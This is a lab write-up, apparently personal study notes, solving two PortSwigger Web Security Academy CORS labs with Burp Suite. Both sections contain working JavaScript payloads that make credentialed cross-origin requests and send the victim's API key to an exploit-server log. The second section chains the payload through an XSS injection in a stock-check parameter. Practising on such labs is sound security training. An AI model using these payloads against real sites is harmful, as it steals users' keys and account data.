### Lab: [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)


	Description: This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all origins.
	To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
	You can log in to your own account using the following credentials: `wiener:peter`


Step 1: Open the application with browser of **Burp Suite**, check out the features of the applicaton
After login with credential: `wiener:peter`, application display this account's API key. 
![](../../Img_note/Pasted%20image%2020221214235519.png)

Go to **HTTP history**, we can see a request to url ==/accountDetails==
![](../../Img_note/Pasted%20image%2020221214235543.png)

We test many origins and found that the application accept all origins with **Access-Control-Allow-Crenditals: true** => insecure

Step 2: 
Because the application trutst all origins and all origins can access resources from the vulnerable domain. 
With the exploit server, i craft a response with script that sent a request to the vulnerable domain and get sensitive infomation from it to exploit server.


```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a7b000a04b147fbc103cbf400f600b0.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

When call function ReqListener, it will come to / endpoint of exploit server with the information  received from the vulnerability application. We can check by come to **Access log**

![](../../Img_note/Pasted%20image%2020221215111002.png)

Submit the api of `Administrator` and we finish the lab
![](../../Img_note/Pasted%20image%2020221215111315.png)


### Lab: [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

	Description: This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all subdomains regardless of the protocol.
	To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials: `wiener:peter`



Step 1: Open the application with browser of **Burp Suite**, check out the features of the applicaton
After login with credential: `wiener:peter`, the application display this account's API key. 

Go to **HTTP history**, we can see a request GET ==/accountDetails==
![](../../Img_note/Pasted%20image%2020221215144830.png)

I sent this request to **Burp Repeater**, tested with many origins to check it CORS and found that it trusts all subdomains regardless of the protocol. => Insecure CORS configuration
![](../../Img_note/Pasted%20image%2020221215144811.png)

Continue with the vulnerable web application, when i use function check stock, a window pop up with **Stock level**. 

![](../../Img_note/Pasted%20image%2020221215145853.png)

This window access to url ==http://stock.[my lab's id].web-security-academy.net/?productId=1&storeId=1 ==
![](../../Img_note/Pasted%20image%2020221215150300.png)

I realized that the above url connects through HTTP protocol

![](../../Img_note/Pasted%20image%2020221215151054.png)


We will create a script as same as Lab: [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
 
```
<script>
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','https://0a69004903d3947ec0063193003c00cb.web-security-academy.net/accountDetails',true); 
	req.withCredentials = true;req.send();

	function reqListener() {location='https://exploit-0ac2005203b7946dc0803074016a00ae.exploit-server.net/log?key='%2bthis.responseText; };
</script>
```

And excute it via Cross-Site scripting (XSS)
```
<script>
    document.location="http://stock.0a69004903d3947ec0063193003c00cb.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a69004903d3947ec0063193003c00cb.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac2005203b7946dc0803074016a00ae.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

To execute the command: 
- Input above script to ==body== in **exploit server**  
- click **Store** and **Deliver exploit to victim**
- Come to **Access Log**  and get the ==apikey==
![](../../Img_note/Pasted%20image%2020221215010006.png)

Submit the ==apikey== at **Submit Solution**

![](../../Img_note/Pasted%20image%2020221215010025.png)




